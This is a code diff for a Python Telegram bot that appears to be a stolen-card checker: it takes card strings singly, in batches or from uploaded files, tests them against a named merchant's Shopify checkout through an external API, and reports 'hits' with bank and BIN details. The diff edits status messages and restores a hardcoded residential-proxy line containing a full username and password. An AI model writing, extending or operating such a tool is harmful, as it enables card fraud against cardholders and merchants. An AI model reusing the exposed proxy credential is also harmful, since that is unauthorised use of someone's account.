@@ -107,7 +107,6 @@ async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     panel_message = (
         f"🛠 Admin Panel & Controls\n\n"
         f"• Gateway: Shopify API Connected ✅\n"
-        f"• Proxy Location: India (J&K) 🇮🇳\n"
         f"• Total Active Users Tracked: {len(ALL_USERS)}\n"
         f"• Total Keys in System: {len(ACTIVE_KEYS)}\n"
         f"• Sub-Admins: {len(SUB_ADMINS)}\n"
@@ -356,6 +355,8 @@ async def process_card_string(card_line, user_full_name):
         bin_info, bank_info, country_info = await get_bin_info(bin_code)
         
         site_url = "https://ripnroll.com"
+        
+        # Original Proxy Setup restored
         proxy_val = "brd-customer-hl_54dda161-zone-isp_proxy1-country-in-state-jammu-and-kashmir:sxf92a7e5g32@brd.superproxy.io:33335"
         
         api_url = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(proxy_val)}"
@@ -389,7 +390,7 @@ async def process_card_string(card_line, user_full_name):
             f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
             f"━━━━━━━━━━━━━━━━━\n"
             f"🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨\n"
-            f"𝗕𝗜𝗡 𝗜𝗻𝐟𝐨: {bin_info}\n"
+            f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info}\n"
             f"𝗕𝗮𝗻𝗸: {bank_info}\n"
             f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
             f"━━━━━━━━━━━━━━━━━\n"
@@ -419,7 +420,7 @@ async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
     card_line = "".join(context.args)
     user_full_name = update.effective_user.first_name
     
-    msg = await update.message.reply_text("⌛ Checking card via India (J&K) Proxy 🇮🇳...")
+    msg = await update.message.reply_text("⌛ Checking card...")
     res = await process_card_string(card_line, user_full_name)
     await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=res)
 
@@ -441,7 +442,7 @@ async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     user_full_name = update.effective_user.first_name
-    msg = await update.message.reply_text("⌛ Processing cards via India (J&K) Proxy 🇮🇳...")
+    msg = await update.message.reply_text("⌛ Processing cards...")
     
     results = []
     for line in lines[:10]:
@@ -471,7 +472,7 @@ async def chf_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     user_full_name = update.effective_user.first_name
-    msg = await update.message.reply_text("⌛ Processing document file via India (J&K) Proxy...")
+    msg = await update.message.reply_text("⌛ Processing document file...")
     file = await context.bot.get_file(document.file_id)
     file_bytes = await file.download_as_bytearray()
     file_text = file_bytes.decode("utf-8", errors="ignore")
@@ -506,9 +507,9 @@ def main():
     
     app.add_handler(MessageHandler(filters.Document.ALL, chf_document))
 
-    print("Bot is up and running with custom hit format and bin lookup...")
+    print("Bot is up and running with original proxy...")
     app.run_polling()
 
 if __name__ == "__main__":
     main()
-                       
+        
